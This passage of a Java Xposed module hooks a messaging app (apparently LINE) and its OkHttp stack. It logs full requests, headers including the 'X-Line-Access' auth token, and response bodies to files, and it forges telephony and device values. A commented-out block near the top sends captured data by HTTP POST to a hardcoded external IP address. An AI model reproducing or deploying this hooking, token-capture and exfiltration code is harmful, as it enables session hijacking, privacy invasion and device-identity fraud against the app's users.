                                OkHttpClient client = new OkHttpClient();

                                Request request = new Request.Builder().url("http://47.242.13.250/updata?mark=test").post(body).build();
                                Response response = client.newCall(request).execute();

                                //Logger.i("xxx_lien_result:code:" + response.code() + " body:" + (response.body() != null ? response.body().string() : "null"));
                                putNum++;

                            }

                            if (headers.get("X-Line-Access") != null) {
                                //Logger.w("xxx_X-Line-Access:" + headers.get("X-Line-Access"));
                            }

                        }
                    });
        } catch (Exception e) {
            Log.d(TAG, "hookLine: exception="+e.toString() );
            e.printStackTrace();
        }
    }
    */

    public void hookLineResponse( XC_LoadPackage.LoadPackageParam sharePkgParam ){
    /*    XposedHelpers.findAndHookMethod("qt.b.b", sharePkgParam.classLoader , "c", okhttp3.Interceptor.Chain.class, okhttp3.Request.class, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                super.beforeHookedMethod(param);
            }
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                try {
                    Response response=(Response) param.getResult();
                    Log.d(TAG, "hookLineResponse: ="+response );
                } catch (Exception e) {
                    Log.d(TAG, "hookLineResponse Exception: "+e.toString() );
                    e.printStackTrace();
                }
            }
        });
*/

        try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass ("sh2.b", sharePkgParam.classLoader ),
                    "intercept", new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                            if ( param.getResult()!=null ){
                                Response response= (Response) param.getResult();
                                Log.d(TAG, "hookLineResponse: "+response.toString() );
                            }else {
                                Log.d(TAG, "hookLineResponse: null");
                            }

                        }
                    });
        } catch (Exception e) {
            Log.d(TAG, "hookLineResponse: Exception "+e.toString() );
            e.printStackTrace();
        }


    }



    public void hookOkResponse( XC_LoadPackage.LoadPackageParam loadPkgParam ){
        try {

            okhttp3.Interceptor interceptor = null;
            //interceptor.intercept( "aaa" );


            XposedHelpers.findAndHookMethod("okhttp3.Interceptor", loadPkgParam.classLoader
                    , "intercept", new XC_MethodHook() {
                        @Override
                        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                            super.afterHookedMethod(param);

                            Log.d(TAG, "intercept: "+param.args[0] );
                            Interceptor.Chain chain= (Interceptor.Chain) param.args[0] ;

                            Request request = chain.request();
                            long startTime = System.currentTimeMillis();
                            okhttp3.Response response = chain.proceed(chain.request());
                            long endTime = System.currentTimeMillis();
                            long duration=endTime-startTime;
                            okhttp3.MediaType mediaType = response.body().contentType();
                            String content = response.body().string();
                            Log.d(TAG,"\n");
                            Log.d(TAG,"----------Start----------------");
                            Log.d(TAG, "| "+request.toString());
                            String method=request.method();

                            if("POST".equals(method)){
                                StringBuilder sb = new StringBuilder();
                                if (request.body() instanceof FormBody) {
                                    FormBody body = (FormBody) request.body();
                                    for (int i = 0; i < body.size(); i++) {
                                        sb.append(body.encodedName(i) + "=" + body.encodedValue(i) + ",");
                                    }
                                    sb.delete(sb.length() - 1, sb.length());
                                    Log.d(TAG, "| RequestParams:{"+sb.toString()+"}");
                                }
                            }
                            Log.d(TAG, "| Response:" + content);
                            Log.d(TAG,"----------End:"+duration+"毫秒----------");

                        }
                    });


          /*  XposedBridge.hookAllMethods( XposedHelpers.findClass ( "okhttp3.Interceptor" , loadPkgParam.classLoader ),
                    "intercept", new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                            super.beforeHookedMethod(param);

                            Log.d(TAG, "intercept: "+param.args[0] );

                            String str="hookOkhttp write: (" + param.args[0] + ")" + param.args[1];

                            StringBuilder sb=new StringBuilder();
                            sb.append( time_() );
                            sb.append("methodABNew : "+ finalMethodB);
                            for (int i=0;i<param.args.length;i++ ){
                                sb.append( "["+param.args[i]+"]" );
                            }
                            str=sb.toString();
//                    String time=Calendar.HOUR+":"+Calendar.MINUTE+":"+Calendar.SECOND;
//                    str=time+"-"+str;
                            Log.d(TAG,str );
                            Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );
                        }
                    });*/
        } catch (Exception e) {
            Log.d(TAG, "methodABNew: Exception "+e.toString() );
            e.printStackTrace();
        }


    }

    private void methodABNew( XC_LoadPackage.LoadPackageParam loadPkgParam
            ,String  className ,String methodANew,String methodBNew  ) {
        //i34,b

        //
//        XposedBridge.hookAllMethods(XposedHelpers.findClass(hookClass, loadPkgParam.classLoader), funcName, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                Log.v(TAG,  ",function name "+funcName +"hookTestValue: ("  + param.args[0] + ")" + param.args[1]  );
//            }
//        });
//        XposedBridge.hookAllMethods(XposedHelpers.findClass(hookClass, loadPkgParam.classLoader), funcName, new XC_MethodHook() {
//            @Override
//            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
//                Log.w(TAG, "read1: (" + param.args[1] + ")" + param.args[0]);
//            }
//        });
//      XposedBridge.hookAllConstructors( "request", )

        String methodA="a";
        String methodB="b";

        if ( methodANew!=null ){
            methodA=methodANew;
        }

        if ( methodBNew!=null ){
            methodB=methodBNew;
        }

        Log.d(TAG, "methodABNew: run" );
        try {
            final String finalMethodB = methodB;
            XposedBridge.hookAllMethods( XposedHelpers.findClass (className, loadPkgParam.classLoader ),
                    methodB, new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {

                            String str="hookOkhttp write: (" + param.args[0] + ")" + param.args[1];
                            StringBuilder sb=new StringBuilder();
                            sb.append( time_() );
                            sb.append("methodABNew : "+ finalMethodB);
                            for (int i=0;i<param.args.length;i++ ){
                                sb.append( "["+param.args[i]+"]" );
                            }
                            str=sb.toString();
//                    String time=Calendar.HOUR+":"+Calendar.MINUTE+":"+Calendar.SECOND;
//                    str=time+"-"+str;
                            Log.d(TAG,str );
                            Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );
                        }
                    });
        } catch (Exception e) {
            Log.d(TAG, "methodABNew: Exception "+e.toString() );
            e.printStackTrace();
        }

        try {

            final String finalMethodA = methodA;
            XposedBridge.hookAllMethods(XposedHelpers.findClass(className, loadPkgParam.classLoader)
                    , methodA, new XC_MethodHook() {
                        @Override
                        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                            //  Log.d(TAG, "hookTestValue read1: (" + param.args[0] + ")" + param.args[1]);
                            String str="hookOkhttp read1: (" + param.args[0] + ")" + param.args[1];
                            StringBuilder sb=new StringBuilder();
                            sb.append( time_() );
                            sb.append("methodABNew : "+ finalMethodA);
                            for (int i=0;i<param.args.length;i++ ){
                                sb.append( "["+param.args[i]+"]" );
                            }
                            str=sb.toString();
                            //String time=Calendar.HOUR+":"+Calendar.MINUTE+":"+Calendar.SECOND;
                            //str=time+"-"+str;
                            Log.d(TAG,str );
                            Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );

                        }
                    });
        } catch (Exception e) {
            Log.d(TAG, "methodABNew Exception="+e.toString() );
            e.printStackTrace();
        } finally {

        }

    }

    public String time_(){
        // System.nanoTime();
        SimpleDateFormat formatter = new SimpleDateFormat("YYYY-MM-dd HH:mm:ss"); //设置时间格式
        formatter.setTimeZone(TimeZone.getTimeZone("GMT+08")); //设置时区
        Date curDate = new Date(System.currentTimeMillis() ); //获取当前时间
        String createDate = formatter.format( curDate) ;

        createDate="("+createDate+" "+System.currentTimeMillis() +") ";
        return createDate;

    }

    private void methodAB( XC_LoadPackage.LoadPackageParam loadPkgParam
                            ,String  className ,String methodANew,String methodBNew  ) {
        //i34,b

        //
//        XposedBridge.hookAllMethods(XposedHelpers.findClass(hookClass, loadPkgParam.classLoader), funcName, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                Log.v(TAG,  ",function name "+funcName +"hookTestValue: ("  + param.args[0] + ")" + param.args[1]  );
//            }
//        });
//        XposedBridge.hookAllMethods(XposedHelpers.findClass(hookClass, loadPkgParam.classLoader), funcName, new XC_MethodHook() {
//            @Override
//            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
//                Log.w(TAG, "read1: (" + param.args[1] + ")" + param.args[0]);
//            }
//        });
//      XposedBridge.hookAllConstructors( "request", )

        String methodA="a";
        String methodB="b";

        if ( methodANew!=null ){
            methodA=methodANew;
        }

        if ( methodBNew!=null ){
            methodB=methodBNew;
        }

        Log.d(TAG, "methodAB: run" );
        try {
            final String finalMethodB = methodB;
            XposedBridge.hookAllMethods( XposedHelpers.findClass (className, loadPkgParam.classLoader ),
                    methodB, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {

                    String str="hookOkhttp write: (" + param.args[0] + ")" + param.args[1];
                    StringBuilder sb=new StringBuilder();
                    sb.append( time_() );
                    sb.append("methodAB write: "+ finalMethodB);

                    for (int i=0;i<param.args.length;i++ ){
                        sb.append( "["+param.args[i]+"]" );
                    }
                    str=sb.toString();
//                    String time=Calendar.HOUR+":"+Calendar.MINUTE+":"+Calendar.SECOND;
//                    str=time+"-"+str;
                    Log.d(TAG,str );
                    Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );
                }
            });
        } catch (Exception e) {
            Log.d(TAG, "methodAB: Exception "+e.toString() );
            e.printStackTrace();
        }

        try {

            final String finalMethodA = methodA;
            XposedBridge.hookAllMethods(XposedHelpers.findClass(className, loadPkgParam.classLoader)
                    , methodA, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                  //  Log.d(TAG, "hookTestValue read1: (" + param.args[0] + ")" + param.args[1]);
                    String str="hookOkhttp read1: (" + param.args[0] + ")" + param.args[1];
                    StringBuilder sb=new StringBuilder();
                    sb.append( time_() );
                    sb.append("methodAB read: "+ finalMethodA);
                    for (int i=0;i<param.args.length;i++ ){
                        sb.append( "["+param.args[i]+"]" );
                    }
                    str=sb.toString();
                    //String time=Calendar.HOUR+":"+Calendar.MINUTE+":"+Calendar.SECOND;
                    //str=time+"-"+str;
                    Log.d(TAG,str );
                    Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );

                }
            });
        } catch (Exception e) {
            Log.d(TAG, "methodAB Exception="+e.toString() );
            e.printStackTrace();
        } finally {

        }

    }

    private void hookTestValueB( XC_LoadPackage.LoadPackageParam loadPkgParam
    ) {

        Log.d(TAG, "hookTestValueB: run" );
        try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass ("qs.a", loadPkgParam.classLoader ), "a", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {

                    //String str="hookTestValueB-a: (" + param.args[0] + ")" + param.args[1];
                    StringBuilder builder=new StringBuilder();
                    for ( Object obj :
                          param.args ) {

                        builder.append( "[" );
                        builder.append(obj.toString() );
                        builder.append("]");
                    }
                    String str= "hookTestValueB-a"+
                            builder.toString();

                    Log.d(TAG,str );
                    Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );

                }
            });
        } catch (Exception e) {
            Log.d(TAG, "hookTestValueB: Exception "+e.toString() );
            e.printStackTrace();
        }

        try {

            XposedBridge.hookAllMethods(XposedHelpers.findClass("qs.a", loadPkgParam.classLoader), "b", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    //  Log.d(TAG, "hookTestValue read1: (" + param.args[0] + ")" + param.args[1]);
                    StringBuilder builder=new StringBuilder();
                    for ( Object obj :
                            param.args ) {

                        builder.append( "[" );
                        builder.append(obj.toString() );
                        builder.append("]");
                    }
                    String str= "hookTestValueB-b"+
                            builder.toString();

                    Log.d(TAG,str );
                    Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );

                }
            });
        } catch (Exception e) {
            Log.d(TAG, "hookTestValue Exception="+e.toString() );
            e.printStackTrace();
        } finally {

        }

    }

public void hookHeader( XC_LoadPackage.LoadPackageParam loadPkgParam){
    try {
        XposedBridge.hookAllMethods( XposedHelpers.findClass ("okhttp3.Request$Builder", loadPkgParam.classLoader ), "headers", new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                StringBuilder sb= new StringBuilder( "hookHeader:" );
                for ( int i=0;i<param.args.length;i++ ){
                    sb.append( "["+param.args[i]+"]"  );
                }
                Log.d(TAG,sb.toString() );
                Ut.fileAppend( HookShare.pathDataLogHeader ,sb.toString() +"\n" );

            }
        });
    } catch (Exception e) {
        Log.d(TAG, "hookHeader: Exception "+e.toString() );
        e.printStackTrace();
    }

}

    private void hookOkhttp( XC_LoadPackage.LoadPackageParam loadPkgParam
    ) {

        Log.d(TAG, "hookOkhttp: run" );
     /*   try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass ("okhttp3.OkHttpClient", loadPkgParam.classLoader ), "newCall", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {

                    //String str="hookTestValueB-a: (" + param.args[0] + ")" + param.args[1];
                    StringBuilder builder=new StringBuilder();

                    Request ok= (Request)param.args[0];
                    builder.append( "[" );
                    builder.append( ok.method() );
                    builder.append("]");
                    builder.append( "[" );
                    builder.append( ok.url() );
                    builder.append("]");
                    builder.append( "[" );
                    builder.append( ok.headers() );
                    builder.append("]");
                    builder.append( "[" );
                    builder.append(ok.body());
                    builder.append("]");
                    builder.append( "[" );
                    builder.append(ok.tag());
                    builder.append("]");

                    String str= "hookOkhttp"+
                            builder.toString();

                  //  Log.d(TAG, "hookOkhttp: "+param.args[0] );

                    Log.d(TAG,str );
                     Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );

                }
            });
        } catch (Exception e) {
            Log.d(TAG, "hookOkhttp: Exception "+e.toString() );
            e.printStackTrace();
        }*/


        try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass ("okhttp3.OkHttpClient", loadPkgParam.classLoader ), "newCall", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                    String str="hookOkhttp: (" + param.args[0] + ")";
   /*                 StringBuilder builder=new StringBuilder();

                    Request ok= (Request)param.args[0];
                    builder.append( "[" );
                    builder.append( ok.method() );
                    builder.append("]");
                    builder.append( "[" );
                    builder.append( ok.url() );
                    builder.append("]");
                    builder.append( "[" );
                    builder.append( ok.headers() );
                    builder.append("]");
                    builder.append( "[" );
                    builder.append(ok.body());
                    builder.append("]");
                    builder.append( "[" );
                    builder.append(ok.tag());
                    builder.append("]");

                    String str= "hookOkhttp"+
                            builder.toString();*/

                    //  Log.d(TAG, "hookOkhttp: "+param.args[0] );

                    Log.d(TAG,str );
                    Ut.fileAppend( HookShare.pathDataLog,str+"\n" );

                }
            });
        } catch (Exception e) {
            Log.d(TAG, "hookOkhttp: Exception "+e.toString() );
            e.printStackTrace();
        }



    }



    private void hookOkhttp2( XC_LoadPackage.LoadPackageParam loadPkgParam
    ) {

        Log.d(TAG, "hookOkhttp ut.a: run" );

        try {
            XposedBridge.hookAllMethods( XposedHelpers.findClass ("ut.a", loadPkgParam.classLoader ), "a", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {

                    String str="hookOkhttp ut.a: (" + param.args[2] + ")"
                   +"(" + param.args[3] + ")"
                   +"(" + param.args[4] + ")"      ;
                    Log.d(TAG,str );
                    Ut.fileAppend( HookShare.pathDataLog2,str+"\n" );

                }
            });
        } catch (Exception e) {
            Log.d(TAG, "hookOkhttp: Exception "+e.toString() );
            e.printStackTrace();
        }



    }



    private void HookTelephony(String hookClass, XC_LoadPackage.LoadPackageParam loadPkgParam,
                               final String funcName, final boolean value) {
        try {

            XposedHelpers.findAndHookMethod(hookClass,
                    loadPkgParam.classLoader, funcName, new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                            super.beforeHookedMethod(param);
                            if(!methodNamelist.contains( funcName ))
                                methodNamelist.add( funcName );
                            Log.d(TAG, "HookTelephony all="+methodNamelist.toString() );
                        }

                        @Override
                        protected void afterHookedMethod(MethodHookParam param)
                                throws Throwable {

                            // TODO Auto-generated method stub
                            super.afterHookedMethod(param);
                            if ( null!=param.getResult() ){
                                Log.d(TAG, "getRealValue:"+funcName+"-result="+param.getResult().toString());
                            }else
                                Log.d(TAG, "getRealValue:"+funcName+"-result=null"  );

                            param.setResult(value);
                            Log.d(TAG, "setHookValue:"+funcName+"-result="+param.getResult().toString()+"set-value="+value   );

                        }

                    });

        } catch (Exception e) {

        }

    }

    private void HookTelephony(String hookClass, XC_LoadPackage.LoadPackageParam loadPkgParam,

            final String funcName, final int value) {
        try {

            XposedHelpers.findAndHookMethod(hookClass,
                    loadPkgParam.classLoader, funcName, new XC_MethodHook() {
                        @Override
                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                            super.beforeHookedMethod(param);
                            if(!methodNamelist.contains( funcName ))
                                methodNamelist.add( funcName );
                            Log.d(TAG, "HookTelephony="+methodNamelist.toString() );
                        }

                        @Override
                        protected void afterHookedMethod(MethodHookParam param)
                                throws Throwable {

                            // TODO Auto-generated method stub
                            super.afterHookedMethod(param);
                            if ( null!=param.getResult() ){
                                Log.d(TAG, "getRealValue:"+funcName+"-result="+param.getResult().toString());
                            }else{
                                Log.d(TAG, "getRealValue:"+funcName+"-result=null"  );
                            }

                                param.setResult(value);
                                Log.d(TAG, "setHookValue:"+funcName+"-result="+param.getResult().toString()+"set-value="+value   );
                             Log.d(TAG, "afterHookedMethod: device=2"+value+",functionName="+value   );
                        }

                    });

        } catch (Exception e) {

        }

    }



    private void HookTelephony(String hookClass, XC_LoadPackage.LoadPackageParam loadPkgParam,
                               final String funcName, final String value) {
        try {

                    XposedHelpers.findAndHookMethod(hookClass,
                    loadPkgParam.classLoader, funcName, new XC_MethodHook() {
                                @Override
                                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                                    super.beforeHookedMethod(param);
                                    if(!methodNamelist.contains( funcName ))
                                        methodNamelist.add( funcName );
                                   // Log.d(TAG, "HookTelephony="+methodNamelist.toString() );
                                }

                                @Override
                        protected void afterHookedMethod(MethodHookParam param)
                                throws Throwable {

                            // TODO Auto-generated method stub
                            super.afterHookedMethod(param);
                            if ( null!=param.getResult() ){
                                Log.d(TAG, "HookTelephony-getRealValue:"+funcName+"-result="+param.getResult().toString());
                            }else
                                Log.d(TAG, "HookTelephony-getRealValue:"+funcName+"-result=null"  );


                                    if(null!=value&&""!=value){
                                        param.setResult(value);
                                Log.d(TAG, "setHookValue:phone"+funcName+"-result="+param.getResult().toString()+"set-value="+value   );
                            }
                                    Log.d(TAG, "afterHookedMethod: phone"+value+"-functionName="+funcName );

                        }

                    });

        } catch (Exception e) {

        }

    }

}